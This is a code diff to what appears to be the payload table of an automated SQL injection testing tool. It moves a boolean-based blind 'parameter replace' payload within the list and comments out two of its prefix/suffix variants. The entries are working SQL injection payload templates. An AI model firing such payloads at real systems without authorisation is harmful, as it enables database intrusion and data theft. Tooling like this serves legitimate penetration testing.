@@ -191,17 +191,6 @@ PAYLOADS = {
                 "dbms": "",
             },
             {
-                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
-                "comments": [
-                    {"pref": "", "suf": ""},
-                    {"pref": "NULL AND 09854=", "suf": "-- wXyW"},
-                    {"pref": "NULL OR 06387=", "suf": "-- wXyW"},
-                ],
-                "title": "Boolean-based blind - Parameter replace (original value)",
-                "vector": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
-                "dbms": "",
-            },
-            {
                 "payload": "OR NOT [RANDNUM]=[RANDNUM]",
                 "comments": [
                     {"pref": " ", "suf": ""},
@@ -249,6 +238,17 @@ PAYLOADS = {
                 ],
                 "title": "OR boolean-based blind - WHERE or HAVING clause",
                 "vector": "OR [INFERENCE]",
+                "dbms": "",
+            },
+            {
+                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                    # {"pref": "NULL AND 09854=", "suf": "-- wXyW"},
+                    # {"pref": "NULL OR 06387=", "suf": "-- wXyW"},
+                ],
+                "title": "Boolean-based blind - Parameter replace (original value)",
+                "vector": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
                 "dbms": "",
             },
             {
